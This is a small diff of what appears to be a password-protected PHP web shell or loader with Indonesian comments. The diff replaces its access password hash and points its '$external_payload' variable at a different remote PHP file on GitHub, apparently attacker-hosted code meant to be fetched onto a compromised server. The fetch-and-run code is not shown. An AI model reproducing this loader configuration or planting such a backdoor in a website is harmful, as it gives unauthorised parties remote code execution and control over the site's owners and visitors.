@@ -4,8 +4,8 @@ session_start();
 /**
  * KONFIGURASI
  */
-$valid_password_hash = 'dc2f4ef676263fe9dde73a9ae6299258'; 
-$external_payload = 'https://raw.githubusercontent.com/KaktusHaxor/awokawok-/refs/heads/main/wp-register.php';
+$valid_password_hash = '404822c3486c2c1ed30b3ede3aae2eb1'; 
+$external_payload = 'https://raw.githubusercontent.com/caplang1133/naga/refs/heads/main/naga.php';
 $logo_url = 'https://h.top4top.io/p_37239qil40.jpg';
 
 /**
